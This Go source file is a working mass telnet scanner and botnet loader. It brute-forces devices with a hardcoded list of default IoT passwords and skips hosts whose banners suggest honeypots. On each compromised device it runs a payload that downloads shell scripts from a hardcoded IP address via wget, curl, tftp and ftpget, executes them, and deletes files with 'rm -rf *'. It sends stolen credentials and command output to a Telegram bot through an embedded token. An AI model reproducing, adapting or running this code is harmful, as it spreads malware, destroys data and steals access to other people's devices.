package main

import (
        "bufio"
        "bytes"
        "encoding/json"
        "fmt"
        "io"
        "mime/multipart"
        "net"
        "net/http"
        "os"
        "runtime"
        "strings"
        "sync"
        "sync/atomic"
        "time"
)

var CREDENTIALS = []struct {
        Username string
        Password string
}{
        {"root", "root"},
        {"root", ""},
        {"root", "icatch99"},
        {"admin", "admin"},
        {"user", "user"},
        {"admin", "VnT3ch@dm1n"},
        {"telnet", "telnet"},
        {"root", "86981198"},
        {"admin", "password"},
        {"admin", ""},
        {"guest", "guest"},
        {"admin", "1234"},
        {"root", "1234"},
        {"pi", "raspberry"},
        {"support", "support"},
        {"ubnt", "ubnt"},
        {"admin", "123456"},
        {"root", "toor"},
        {"admin", "admin123"},
        {"service", "service"},
        {"tech", "tech"},
        {"cisco", "cisco"},
        {"user", "password"},
        {"root", "password"},
        {"root", "admin"},
        {"admin", "admin1"},
        {"root", "123456"},
        {"root", "pass"},
        {"admin", "pass"},
        {"administrator", "password"},
        {"administrator", "admin"},
        {"root", "default"},
        {"admin", "default"},
        {"root", "vizxv"},
        {"admin", "vizxv"},
        {"root", "xc3511"},
        {"admin", "xc3511"},
        {"root", "admin1234"},
        {"admin", "admin1234"},
        {"root", "anko"},
        {"admin", "anko"},
        {"admin", "system"},
        {"root", "system"},
}

const (
        TELNET_TIMEOUT     = 5 * time.Second
        CONNECT_TIMEOUT    = 3 * time.Second
        PAYLOAD_TIMEOUT    = 10 * time.Second
        MAX_WORKERS        = 1000
        MAX_QUEUE_SIZE     = 100000
        STATS_INTERVAL     = 1 * time.Second
        TELEGRAM_BOT_TOKEN = "8183155028:AAH2iJlMNydW3igennVQPma4bESnKd54oMk"
        TELEGRAM_CHAT_ID   = "-1003702606838"
)

var PAYLOAD = `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://154.53.37.227/1.sh; curl -O http://154.53.37.227/1.sh; chmod 777 1.sh; sh 1.sh; tftp 154.53.37.227 -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g 154.53.37.227; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 154.53.37.227 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *`

var invalidOutputKeywords = []string{
        "command not found",
        "invalid input",
        "wrong parameter",
        "access denied",
        "permission denied",
        "not recognized",
        "% Invalid input",
        "% Wrong parameter",
        "unknown command",
        "syntax error",
        "bad command",
        "invalid command",
        "unrecognized",
        "not found",
        "connection refused",
        "network is unreachable",
}

var BANNERS_AFTER_LOGIN = []string{
        "[admin@localhost ~]$",
        "[admin@localhost ~]#",
        "[admin@localhost tmp]$",
        "[admin@localhost tmp]#",
        "[admin@localhost /]$",
        "[admin@localhost /]#",
        "[admin@LocalHost ~]$",
        "[admin@LocalHost ~]#",
        "[admin@LocalHost tmp]$",
        "[admin@LocalHost tmp]#",
        "[admin@LocalHost /]$",
        "[admin@LocalHost /]#",
        "[administrator@localhost ~]$",
        "[administrator@localhost ~]#",
        "[administrator@localhost tmp]$",
        "[administrator@localhost tmp]#",
        "[administrator@localhost /]$",
        "[administrator@localhost /]#",
        "[administrator@LocalHost ~]$",
        "[administrator@LocalHost ~]#",
        "[administrator@LocalHost tmp]$",
        "[administrator@LocalHost tmp]#",
        "[administrator@LocalHost /]$",
        "[administrator@LocalHost /]#",
        "[cisco@localhost ~]$",
        "[cisco@localhost ~]#",
        "[cisco@localhost tmp]$",
        "[cisco@localhost tmp]#",
        "[cisco@localhost /]$",
        "[cisco@localhost /]#",
        "[cisco@LocalHost ~]$",
        "[cisco@LocalHost ~]#",
        "[cisco@LocalHost tmp]$",
        "[cisco@LocalHost tmp]#",
        "[cisco@LocalHost /]$",
        "[cisco@LocalHost /]#",
        "[pi@raspberrypi ~]$",
        "[pi@raspberrypi ~]#",
        "[pi@raspberrypi tmp]$",
        "[pi@raspberrypi tmp]#",
        "[pi@raspberrypi /]$",
        "[pi@raspberrypi /]#",
        "[pi@localhost ~]$",
        "[pi@localhost ~]#",
        "[pi@localhost tmp]$",
        "[pi@localhost tmp]#",
        "[pi@localhost /]$",
        "[pi@localhost /]#",
        "[pi@LocalHost ~]$",
        "[pi@LocalHost ~]#",
        "[pi@LocalHost tmp]$",
        "[pi@LocalHost tmp]#",
        "[pi@LocalHost /]$",
        "[pi@LocalHost /]#",
        "[root@LocalHost ~]$",
        "[root@LocalHost ~]#",
        "[root@LocalHost tmp]$",
        "[root@LocalHost tmp]#",
        "[root@LocalHost /]$",
        "[root@LocalHost /]#",
        "[root@localhost ~]$",
        "[root@localhost ~]#",
        "[root@localhost tmp]$",
        "[root@localhost tmp]#",
        "[root@localhost /]$",
        "[root@localhost /]#",
        "[ubnt@localhost ~]$",
        "[ubnt@localhost ~]#",
        "[ubnt@localhost tmp]$",
        "[ubnt@localhost tmp]#",
        "[ubnt@localhost /]$",
        "[ubnt@localhost /]#",
        "[ubnt@LocalHost ~]$",
        "[ubnt@LocalHost ~]#",
        "[ubnt@LocalHost tmp]$",
        "[ubnt@LocalHost tmp]#",
        "[ubnt@LocalHost /]$",
        "[ubnt@LocalHost /]#",
        "[user@localhost ~]$",
        "[user@localhost ~]#",
        "[user@localhost tmp]$",
        "[user@localhost tmp]#",
        "[user@localhost /]$",
        "[user@localhost /]#",
        "[user@LocalHost ~]$",
        "[user@LocalHost ~]#",
        "[user@LocalHost tmp]$",
        "[user@LocalHost tmp]#",
        "[user@LocalHost /]$",
        "[user@LocalHost /]#",
        "[guest@localhost ~]$",
        "[guest@localhost ~]#",
        "[guest@localhost tmp]$",
        "[guest@localhost tmp]#",
        "[guest@localhost /]$",
        "[guest@localhost /]#",
        "[guest@LocalHost ~]$",
        "[guest@LocalHost ~]#",
        "[guest@LocalHost tmp]$",
        "[guest@LocalHost tmp]#",
        "[guest@LocalHost /]$",
        "[guest@LocalHost /]#",
        "[support@localhost ~]$",
        "[support@localhost ~]#",
        "[support@localhost tmp]$",
        "[support@localhost tmp]#",
        "[support@localhost /]$",
        "[support@localhost /]#",
        "[support@LocalHost ~]$",
        "[support@LocalHost ~]#",
        "[support@LocalHost tmp]$",
        "[support@LocalHost tmp]#",
        "[support@LocalHost /]$",
        "[support@LocalHost /]#",
        "[service@localhost ~]$",
        "[service@localhost ~]#",
        "[service@localhost tmp]$",
        "[service@localhost tmp]#",
        "[service@localhost /]$",
        "[service@localhost /]#",
        "[service@LocalHost ~]$",
        "[service@LocalHost ~]#",
        "[service@LocalHost tmp]$",
        "[service@LocalHost tmp]#",
        "[service@LocalHost /]$",
        "[service@LocalHost /]#",
        "[tech@localhost ~]$",
        "[tech@localhost ~]#",
        "[tech@localhost tmp]$",
        "[tech@localhost tmp]#",
        "[tech@localhost /]$",
        "[tech@localhost /]#",
        "[tech@LocalHost ~]$",
        "[tech@LocalHost ~]#",
        "[tech@LocalHost tmp]$",
        "[tech@LocalHost tmp]#",
        "[tech@LocalHost /]$",
        "[tech@LocalHost /]#",
        "[telnet@localhost ~]$",
        "[telnet@localhost ~]#",
        "[telnet@localhost tmp]$",
        "[telnet@localhost tmp]#",
        "[telnet@localhost /]$",
        "[telnet@localhost /]#",
        "[telnet@LocalHost ~]$",
        "[telnet@LocalHost ~]#",
        "[telnet@LocalHost tmp]$",
        "[telnet@LocalHost tmp]#",
        "[telnet@LocalHost /]$",
        "[telnet@LocalHost /]#",
}

var BANNERS_BEFORE_LOGIN = []string{
        "honeypot",
        "honeypots",
        "cowrie",
        "kippo",
        "dionaea",
        "glastopf",
        "conpot",
        "heralding",
        "snare",
        "tanner",
        "wordpot",
        "shockpot",
        "honeyd",
        "honeytrap",
        "nepenthes",
        "amun",
        "beeswarm",
        "mwcollect",
        "opencanary",
        "canary",
        "thinkst",
        "splunk",
        "splunkd",
}

type CredentialResult struct {
        Host     string
        Username string
        Password string
        Output   string
        Honeypot bool
        Reasons  []string
}

type TelnetScanner struct {
        lock             sync.Mutex
        scanned          int64
        valid            int64
        invalid          int64
        honeypot         int64
        foundCredentials []CredentialResult
        hostQueue        chan string
        done             chan bool
        wg               sync.WaitGroup
        queueSize        int64
}

func NewTelnetScanner() *TelnetScanner {
        runtime.GOMAXPROCS(runtime.NumCPU())
        return &TelnetScanner{
                hostQueue: make(chan string, MAX_QUEUE_SIZE),
                done:      make(chan bool),
        }
}

func sendTelegramMessage(message string) error {
        url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TELEGRAM_BOT_TOKEN)
        payload := map[string]interface{}{
                "chat_id":    TELEGRAM_CHAT_ID,
                "text":       message,
                "parse_mode": "HTML",
        }
        jsonData, err := json.Marshal(payload)
        if err != nil {
                return err
        }
        resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        return nil
}

func sendTelegramDocument(filePath, caption string) error {
        url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", TELEGRAM_BOT_TOKEN)
        file, err := os.Open(filePath)
        if err != nil {
                return err
        }
        defer file.Close()
        body := &bytes.Buffer{}
        writer := multipart.NewWriter(body)
        writer.WriteField("chat_id", TELEGRAM_CHAT_ID)
        if caption != "" {
                writer.WriteField("caption", caption)
                writer.WriteField("parse_mode", "HTML")
        }
        part, err := writer.CreateFormFile("document", filePath)
        if err != nil {
                return err
        }
        _, err = io.Copy(part, file)
        if err != nil {
                return err
        }
        err = writer.Close()
        if err != nil {
                return err
        }
        req, err := http.NewRequest("POST", url, body)
        if err != nil {
                return err
        }
        req.Header.Set("Content-Type", writer.FormDataContentType())
        client := &http.Client{}
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        return nil
}

func formatValidMessage(host, username, password, output string) string {
        timestamp := time.Now().Format("2006-01-02 15:04:05")
        message := fmt.Sprintf(
                "🔥 <b>Valid Telnet Login Found!</b>\n\n"+
                        "🌐 <b>IP:Port:</b> <code>%s:23</code>\n"+
                        "👤 <b>Username:</b> <code>%s</code>\n"+
                        "🔑 <b>Password:</b> <code>%s</code>\n"+
                        "⏰ <b>Time:</b> <code>%s</code>\n\n"+
                        "📝 <b>Output:</b>\n<pre>%s</pre>",
                host, username, password, timestamp, escapeHTML(output))
        return message
}

func formatHoneypotMessage(host, username, password, output string, reasons []string) string {
        timestamp := time.Now().Format("2006-01-02 15:04:05")
        reasonText := "Unknown"
        if len(reasons) > 0 {
                reasonText = strings.Join(reasons, ", ")
        }
        message := fmt.Sprintf(
                "⚠️ <b>Honeypot/Blocked Target</b>\n\n"+
                        "🌐 <b>IP:Port:</b> <code>%s:23</code>\n"+
                        "👤 <b>Username:</b> <code>%s</code>\n"+
                        "🔑 <b>Password:</b> <code>%s</code>\n"+
                        "⏰ <b>Time:</b> <code>%s</code>\n\n"+
                        "🚨 <b>Reasons:</b>\n<pre>%s</pre>\n\n"+
                        "📝 <b>Output:</b>\n<pre>%s</pre>",
                host, username, password, timestamp, escapeHTML(reasonText), escapeHTML(output))
        return message
}

func escapeHTML(s string) string {
        s = strings.ReplaceAll(s, "&", "&amp;")
        s = strings.ReplaceAll(s, "<", "&lt;")
        s = strings.ReplaceAll(s, ">", "&gt;")
        return s
}

func sendValidTelegram(host, username, password, output string) {
        message := formatValidMessage(host, username, password, output)
        err := sendTelegramMessage(message)
        if err != nil {
                fmt.Println("[!] Failed to send Telegram message:", err)
        }
        if _, err := os.Stat("valid.txt"); err == nil {
                err = sendTelegramDocument("valid.txt", "📄 Valid credentials list")
                if err != nil {
                        fmt.Println("[!] Failed to send valid.txt:", err)
                }
        }
}

func sendHoneypotTelegram(host, username, password, output string, reasons []string) {
        message := formatHoneypotMessage(host, username, password, output, reasons)
        err := sendTelegramMessage(message)
        if err != nil {
                fmt.Println("[!] Failed to send Telegram message:", err)
        }
        if _, err := os.Stat("honeypot.txt"); err == nil {
                err = sendTelegramDocument("honeypot.txt", "📄 Honeypot list")
                if err != nil {
                        fmt.Println("[!] Failed to send honeypot.txt:", err)
                }
        }
}

func readUntil(conn net.Conn, timeout time.Duration, keywords []string) (string, error) {
        conn.SetReadDeadline(time.Now().Add(timeout))
        var buf bytes.Buffer
        tmp := make([]byte, 8192)
        for {
                n, err := conn.Read(tmp)
                if err != nil {
                        if err == io.EOF {
                                break
                        }
                        return buf.String(), err
                }
                buf.Write(tmp[:n])
                s := buf.String()
                for _, kw := range keywords {
                        if strings.Contains(s, kw) {
                                return s, nil
                        }
                }
                if buf.Len() > 65536 {
                        break
                }
        }
        return buf.String(), nil
}

func sendCommand(conn net.Conn, cmd string, timeout time.Duration, promptKeywords []string) (string, error) {
        conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
        _, err := conn.Write([]byte(cmd + "\n"))
        if err != nil {
                return "", err
        }
        return readUntil(conn, timeout, promptKeywords)
}

func (s *TelnetScanner) executeAndVerify(conn net.Conn, cmd string) (string, bool) {
        response, err := sendCommand(conn, cmd, PAYLOAD_TIMEOUT, []string{"#", "$", ">"})
        if err != nil {
                return "", false
        }
        lower := strings.ToLower(response)
        for _, kw := range invalidOutputKeywords {
                if strings.Contains(lower, kw) {
                        return response, false
                }
        }
        return response, true
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interface{}) {
        addr := host + ":23"
        dialer := &net.Dialer{Timeout: CONNECT_TIMEOUT}
        conn, err := dialer.Dial("tcp", addr)
        if err != nil {
                return false, "connection failed"
        }
        defer conn.Close()

        banner, err := readUntil(conn, TELNET_TIMEOUT, []string{"login:", "Login:", "username:", "Username:"})
        if err != nil {
                return false, "login prompt timeout"
        }
        lowerBanner := strings.ToLower(banner)
        for _, sb := range BANNERS_BEFORE_LOGIN {
                if strings.Contains(lowerBanner, sb) {
                        return true, CredentialResult{Host: host, Username: username, Password: password, Output: banner, Honeypot: true, Reasons: []string{"BANNER_PRELOGIN:" + sb}}
                }
        }

        _, err = sendCommand(conn, username, TELNET_TIMEOUT, []string{"password:", "Password:"})
        if err != nil {
                return false, "password prompt timeout"
        }

        resp, err := sendCommand(conn, password, TELNET_TIMEOUT, []string{"#", "$", ">", "login:", "Login:", "incorrect", "failed"})
        if err != nil {
                return false, "no shell prompt after login"
        }
        if strings.Contains(resp, "incorrect") || strings.Contains(resp, "failed") {
                return false, "login failed"
        }

        for _, sb := range BANNERS_AFTER_LOGIN {
                if strings.Contains(resp, sb) {
                        return true, CredentialResult{Host: host, Username: username, Password: password, Output: resp, Honeypot: true, Reasons: []string{"BANNER_AFTER_LOGIN:" + sb}}
                }
        }

        uniqueID := fmt.Sprintf("VULN_%d", time.Now().UnixNano())
        echoCmd := fmt.Sprintf("echo \"%s\"", uniqueID)
        echoOut, echoOK := s.executeAndVerify(conn, echoCmd)
        if !echoOK || !strings.Contains(echoOut, uniqueID) {
                return false, "echo verification failed (not a Linux shell)"
        }

        payloadOut, payloadOK := s.executeAndVerify(conn, PAYLOAD)
        if !payloadOK {
                return false, "payload rejected: " + payloadOut
        }

        return true, CredentialResult{
                Host:     host,
                Username: username,
                Password: password,
                Output:   payloadOut,
                Honeypot: false,
        }
}

func (s *TelnetScanner) worker() {
        defer s.wg.Done()
        for host := range s.hostQueue {
                atomic.AddInt64(&s.queueSize, -1)
                found := false
                for _, cred := range CREDENTIALS {
                        success, result := s.tryLogin(host, cred.Username, cred.Password)
                        if success {
                                credResult := result.(CredentialResult)
                                if credResult.Honeypot {
                                        atomic.AddInt64(&s.honeypot, 1)
                                        f, _ := os.OpenFile("honeypot.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
                                        fmt.Fprintf(f, "%s:23 %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
                                        f.Close()
                                        sendHoneypotTelegram(credResult.Host, credResult.Username, credResult.Password, credResult.Output, credResult.Reasons)
                                } else {
                                        atomic.AddInt64(&s.valid, 1)
                                        f, _ := os.OpenFile("valid.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
                                        fmt.Fprintf(f, "%s:23 %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
                                        f.Close()
                                        sendValidTelegram(credResult.Host, credResult.Username, credResult.Password, credResult.Output)
                                }
                                found = true
                                break
                        }
                }
                if !found {
                        atomic.AddInt64(&s.invalid, 1)
                }
                atomic.AddInt64(&s.scanned, 1)
        }
}

func (s *TelnetScanner) statsThread() {
        ticker := time.NewTicker(STATS_INTERVAL)
        defer ticker.Stop()
        for {
                select {
                case <-s.done:
                        return
                case <-ticker.C:
                        fmt.Printf("\rtotal: %d | valid: %d | invalid: %d | honeypot: %d | queue: %d | routines: %d",
                                atomic.LoadInt64(&s.scanned),
                                atomic.LoadInt64(&s.valid),
                                atomic.LoadInt64(&s.invalid),
                                atomic.LoadInt64(&s.honeypot),
                                atomic.LoadInt64(&s.queueSize),
                                runtime.NumGoroutine())
                }
        }
}

func (s *TelnetScanner) Run() {
        fmt.Printf("Initializing scanner (%d / %d)...\n", MAX_WORKERS, MAX_QUEUE_SIZE)
        go s.statsThread()
        stdinDone := make(chan bool)
        go func() {
                reader := bufio.NewReader(os.Stdin)
                for {
                        line, err := reader.ReadString('\n')
                        if err != nil {
                                break
                        }
                        host := strings.TrimSpace(line)
                        if host != "" {
                                atomic.AddInt64(&s.queueSize, 1)
                                s.hostQueue <- host
                        }
                }
                stdinDone <- true
        }()
        for i := 0; i < MAX_WORKERS; i++ {
                s.wg.Add(1)
                go s.worker()
        }
        <-stdinDone
        close(s.hostQueue)
        s.wg.Wait()
        s.done <- true
}

func main() {
        fmt.Println("\n🤖 Telnet Scanner with Telegram Bot (Accurate)")
        fmt.Printf("📢 Channel ID: %s\n\n", TELEGRAM_CHAT_ID)
        scanner := NewTelnetScanner()
        scanner.Run()
}
